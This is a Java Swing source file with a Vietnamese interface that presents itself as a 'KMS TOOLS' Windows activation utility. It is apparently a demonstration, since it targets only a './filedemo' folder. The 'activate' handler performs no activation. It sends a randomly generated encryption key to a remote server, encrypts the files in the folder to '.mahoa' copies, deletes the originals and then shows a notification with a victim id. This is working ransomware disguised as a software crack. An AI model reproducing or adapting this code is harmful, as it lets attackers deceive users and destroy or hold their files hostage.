/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package gui;

import Utils.FileEncryptor;
import Utils.FileUtils;
import com.google.gson.Gson;
import dto.Keys;
import java.awt.Color;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.function.Consumer;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

/**
 *
 * @author mthuan
 */
public class KMS extends javax.swing.JFrame {
    private String id;
    //private final String BASE_URL = "http://localhost:3001";
    private final String BASE_URL = "https://anninhmang.onrender.com";
    /**
     * Creates new form KMS
     */
    public KMS() {

        initComponents();
        initFrame();
        initSelect();

    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        kGradientPanel1 = new keeptoo.KGradientPanel();
        jLabel2 = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        selectVer = new javax.swing.JComboBox<>();
        jLabel4 = new javax.swing.JLabel();
        selectTime = new javax.swing.JComboBox<>();
        jLabel5 = new javax.swing.JLabel();
        selectServer = new javax.swing.JComboBox<>();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        activeBtn = new javax.swing.JButton();
        closeBtn = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setUndecorated(true);

        kGradientPanel1.setkEndColor(new java.awt.Color(176, 106, 179));
        kGradientPanel1.setkGradientFocus(600);
        kGradientPanel1.setkStartColor(new java.awt.Color(69, 104, 220));
        kGradientPanel1.setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jLabel2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-microsoft-office-2019-48.png"))); // NOI18N
        kGradientPanel1.add(jLabel2, new org.netbeans.lib.awtextra.AbsoluteConstraints(28, 26, -1, -1));

        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-windows-10-48.png"))); // NOI18N
        kGradientPanel1.add(jLabel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(50, 40, -1, -1));

        jLabel3.setForeground(new java.awt.Color(255, 255, 255));
        jLabel3.setText("-- Lựa chọn phiên bản:");
        kGradientPanel1.add(jLabel3, new org.netbeans.lib.awtextra.AbsoluteConstraints(28, 133, -1, -1));

        selectVer.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "Item 1", "Item 2", "Item 3", "Item 4" }));
        kGradientPanel1.add(selectVer, new org.netbeans.lib.awtextra.AbsoluteConstraints(28, 155, 197, -1));

        jLabel4.setForeground(new java.awt.Color(255, 255, 255));
        jLabel4.setText("-- Lựa lòng chọn thời hạn:");
        kGradientPanel1.add(jLabel4, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 260, 197, -1));

        selectTime.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "Item 1", "Item 2", "Item 3", "Item 4" }));
        kGradientPanel1.add(selectTime, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 280, 197, -1));

        jLabel5.setForeground(new java.awt.Color(255, 255, 255));
        jLabel5.setText("-- Chọn máy chủ:");
        kGradientPanel1.add(jLabel5, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 200, 197, -1));

        selectServer.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "Item 1", "Item 2", "Item 3", "Item 4" }));
        kGradientPanel1.add(selectServer, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 220, 197, -1));

        jLabel6.setFont(new java.awt.Font("Lucida Grande", 1, 36)); // NOI18N
        jLabel6.setForeground(new java.awt.Color(255, 255, 255));
        jLabel6.setText("KMS TOOLS");
        kGradientPanel1.add(jLabel6, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 20, -1, -1));

        jLabel7.setFont(new java.awt.Font("Lucida Grande", 3, 13)); // NOI18N
        jLabel7.setForeground(new java.awt.Color(255, 204, 204));
        jLabel7.setText("Uy tín - an toàn - chính hãng");
        kGradientPanel1.add(jLabel7, new org.netbeans.lib.awtextra.AbsoluteConstraints(150, 70, -1, -1));

        activeBtn.setBackground(new java.awt.Color(255, 255, 255));
        activeBtn.setFont(new java.awt.Font("Lucida Grande", 1, 18)); // NOI18N
        activeBtn.setForeground(new java.awt.Color(120, 102, 203));
        activeBtn.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-arrow-60.png"))); // NOI18N
        activeBtn.setText("Kích hoạt  ");
        activeBtn.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, new java.awt.Color(255, 255, 255), new java.awt.Color(255, 255, 255), new java.awt.Color(255, 255, 255), new java.awt.Color(255, 255, 255)));
        activeBtn.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                activeClick(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                activeExit(evt);
            }
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                activeBtnEntered(evt);
            }
        });
        kGradientPanel1.add(activeBtn, new org.netbeans.lib.awtextra.AbsoluteConstraints(270, 150, 180, 90));

        closeBtn.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-close-window-32.png"))); // NOI18N
        closeBtn.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                closeEvent(evt);
            }
        });
        kGradientPanel1.add(closeBtn, new org.netbeans.lib.awtextra.AbsoluteConstraints(480, 0, -1, -1));

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(kGradientPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(kGradientPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, 336, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void activeBtnEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_activeBtnEntered
        // TODO add your handling code here:
        activeBtn.setBackground(new Color(120, 102, 203));
        activeBtn.setForeground(Color.WHITE);
    }//GEN-LAST:event_activeBtnEntered

    private void activeExit(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_activeExit
        // TODO add your handling code here:
        activeBtn.setBackground(Color.WHITE);
        activeBtn.setForeground(new Color(120, 102, 203));
    }//GEN-LAST:event_activeExit

    private void closeEvent(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_closeEvent
        // TODO add your handling code here:
        int select = JOptionPane.showConfirmDialog(
                null, 
                "Bạn có muốn thoát khỏi chương trình ?",
                "Xác nhận thoát",JOptionPane.YES_NO_OPTION
        );
        
        if(select == 0) System.exit(0);
    }//GEN-LAST:event_closeEvent

    private void activeClick(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_activeClick
        // TODO add your handling code here:
        int select = JOptionPane.showConfirmDialog(null,
                String.format(
                        "Bạn đã lựa chọn:\n\nPhiên bản: %s\nMáy chủ: %s\nThời gian kích hoạt: %s\n\nBạn có chắc chắn với sự lựa chọn ?",
                        selectVer.getSelectedItem(),
                        selectServer.getSelectedItem(),
                        selectTime.getSelectedItem()
                ),
                "Xác nhận kích hoạt",
                JOptionPane.YES_NO_OPTION
        );
        if (select == 0) {
            String randomKey = createRandomKeyString(16);
            if (randomKey == null) {
                JOptionPane.showMessageDialog(null, "Kích hoạt thất bại vui lòng thử lại ");
                return;
            }
            Keys keys = new Keys(randomKey);
            //Send to server
            boolean isSave = saveToServer(keys);

            if (isSave) {
                encryptFile(randomKey);
                
                new Notification(this.id).setVisible(true);
                this.setVisible(false);

            } else {
                JOptionPane.showMessageDialog(null, "Kích hoạt thất bại vui lòng thử lại ");
            }

        }
    }//GEN-LAST:event_activeClick
    private String createRandomKeyString(int length) {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(length);
        String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        for (int i = 0; i < length; i++) {
            sb.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));
        }

        return sb.toString();
    }
    
    private boolean saveToServer(Keys keys) {
        try {
            // Define the API endpoint URL
            URL url = new URL(BASE_URL+"/save");
//                    URL url = new URL("https://anninhmang.onrender.com/save");

            // Create an HTTP connection to the API endpoint
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");

            // Set the request headers (if any)
            connection.setRequestProperty("Content-Type", "application/json");

            // Set the request body
            String requestBody = new Gson().toJson(keys);

            byte[] requestBodyBytes = requestBody.getBytes("UTF-8");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Length", String.valueOf(requestBodyBytes.length));
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestBodyBytes);
            outputStream.flush();
            outputStream.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            String idResponse = br.readLine().replaceAll("\"", "");

            this.id = idResponse;

            return (connection.getResponseCode() == 200) ? true : false;

        } catch (Exception ex) {
            JOptionPane.showMessageDialog(null, "Kết nối đến server thất bại vui lòng kiểm tra kết nối và thử lại");
        }
        return false;

    }
    
    private void encryptFile(String key) {
        File dir = new File(new File("./filedemo").getAbsolutePath());
        List<String> fileList = FileUtils.readAllFileinFolder(new ArrayList<>(), dir);
        List<String> fillterFileList = FileUtils.fillterFile(fileList);

        fillterFileList.stream().forEach(new Consumer<String>() {
            @Override
            public void accept(String path) {
                try {
                    File inputFile = new File(path);
                    File outputFile = new File(path + ".mahoa");
                    
                    FileEncryptor.encrypt(inputFile, outputFile, key);
                    FileUtils.delete(path);
                    
                    
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        });   
    }
    


    
    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(KMS.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(KMS.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(KMS.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(KMS.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new KMS().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton activeBtn;
    private javax.swing.JLabel closeBtn;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private keeptoo.KGradientPanel kGradientPanel1;
    private javax.swing.JComboBox<String> selectServer;
    private javax.swing.JComboBox<String> selectTime;
    private javax.swing.JComboBox<String> selectVer;
    // End of variables declaration//GEN-END:variables

    private void initFrame() {
        this.setLocationRelativeTo(this);
    }

    private void initSelect() {
        this.selectVer.removeAllItems();
        this.selectVer.addItem("Windows XP All Version");
        this.selectVer.addItem("Windows 7 All Version");
        this.selectVer.addItem("Windows 8 All Version");
        this.selectVer.addItem("Windows 8.1 All Version");
        this.selectVer.addItem("Windows 10 All Version");
        this.selectVer.addItem("Windows 11 All Version");
        
        this.selectServer.removeAllItems();
        this.selectServer.addItem("kms8.msguides.com");
        this.selectServer.addItem("zh.us.to");
        this.selectServer.addItem("kms.digiboy.ir");
        this.selectServer.addItem("kms.digiboy.ir");
        this.selectServer.addItem("kms.lotro.cc");
        
        this.selectTime.removeAllItems();
        this.selectTime.addItem("6 tháng");
        this.selectTime.addItem("1 năm");
        this.selectTime.addItem("Vĩnh viễn");


    }
    
}
